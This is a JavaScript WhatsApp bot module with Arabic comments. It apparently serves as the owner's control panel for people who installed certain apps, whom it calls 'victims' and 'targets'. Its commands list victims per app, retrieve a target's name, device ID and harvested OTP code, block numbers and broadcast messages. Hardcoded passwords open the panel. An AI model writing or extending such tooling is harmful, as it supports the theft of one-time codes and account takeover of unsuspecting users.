const fs = require('fs');

class SecretaryCommandSystem {
    constructor() {
        this.commandRegistry = new Map();
        this.adminRegistry = new Map();
        this.registerNaturalCommands();
    }

    registerNaturalCommands() {
        this.commandRegistry.set('الاوامر', this.handleNaturalHelp);
        this.commandRegistry.set('احصائيات', this.handleStats);
        // يمكنك إضافة بقية الأوامر القديمة هنا
    }

    async handleManualCommand(text, jid, isOwner, pushName, sock, db) {
        const cleanText = text.trim();
        
        // 🛠️ أوامر الإدارة "نجم"
        if (isOwner && cleanText.startsWith('نجم')) {
            const args = cleanText.split(' ');
            const cmd = args[1]; // الأمر
            const target = args[2]; // الرقم أو المحتوى

            switch (cmd) {
                case 'حضر':
                    if (!target) return "⚠️ يرجى إدخال الرقم. مثال: نجم حضر 9665xxx";
                    await db.collection('banned_apps').doc(target).set({ banned: true });
                    return `🚫 تم حظر الرقم ${target} من فتح التطبيقات.`;

                case 'نشر':
                    const msg = args.slice(2).join(' ');
                    if (!msg) return "⚠️ أدخل نص النشر.";
                    const users = await db.collection('app_users').get();
                    let count = 0;
                    users.forEach(async (doc) => {
                        await sock.sendMessage(doc.id + "@s.whatsapp.net", { text: `📢 إعلان إداري:\n\n${msg}` });
                        count++;
                    });
                    return `✅ جاري النشر إلى ${count} مستخدم...`;

                case 'احصا':
                    const appSnapshot = await db.collection('app_users').get();
                    const apps = {};
                    appSnapshot.forEach(doc => {
                        const data = doc.data();
                        apps[data.appName] = (apps[data.appName] || 0) + 1;
                    });
                    let statsMsg = `📊 *إحصائيات المستخدمين:*\n\n`;
                    Object.entries(apps).forEach(([name, val]) => statsMsg += `• ${name}: ${val} مستخدم\n`);
                    statsMsg += `\n🔢 الإجمالي: ${appSnapshot.size}`;
                    return statsMsg;

                case 'معلومات':
                    if (!target) return "⚠️ أدخل الرقم.";
                    const userDoc = await db.collection('app_users').doc(target).get();
                    if (!userDoc.exists) return "❌ المستخدم غير موجود.";
                    const u = userDoc.data();
                    return `👤 *معلومات الهدف:*\n\nالاسم: ${u.name}\nالجهاز: ${u.deviceId}\nالتطبيق: ${u.appName}\nالحالة: ${u.status}\nالكود: ${u.otpCode}`;
            }
        }

        // الأوامر العادية
        for (const [command, handler] of this.commandRegistry) {
            if (cleanText.includes(command)) return await handler(pushName);
        }
        
        // كلمات السر (نجم1997)
        if (cleanText === 'نجم1997' || cleanText === 'راشد123') return this.getControlPanel(pushName, isOwner);

        return null;
    }

    getControlPanel(pushName, isOwner) {
        let p = `*مرحباً ${pushName} 👋*\nأنا سكرتيرك الذكي.\n\n`;
        if (isOwner) {
            p += `*🛠️ أوامر التحكم (نجم):*\n`;
            p += `• نجم احصا (لرؤية الضحايا)\n`;
            p += `• نجم حضر [الرقم] (لقفل التطبيق عنه)\n`;
            p += `• نجم معلومات [الرقم] (سحب بياناته)\n`;
            p += `• نجم نشر [النص] (إرسال للكل)\n`;
        }
        return p;
    }

    async handleNaturalHelp(name) {
        return `أهلاً ${name}، يمكنك التحدث معي بشكل طبيعي أو طلب (احصائيات) الخدمة.`;
    }
}

const secretaryCommands = new SecretaryCommandSystem();
module.exports = { 
    handleManualCommand: (text, jid, isOwner, pushName, sock, db) => 
    secretaryCommands.handleManualCommand(text, jid, isOwner, pushName, sock, db) 
};
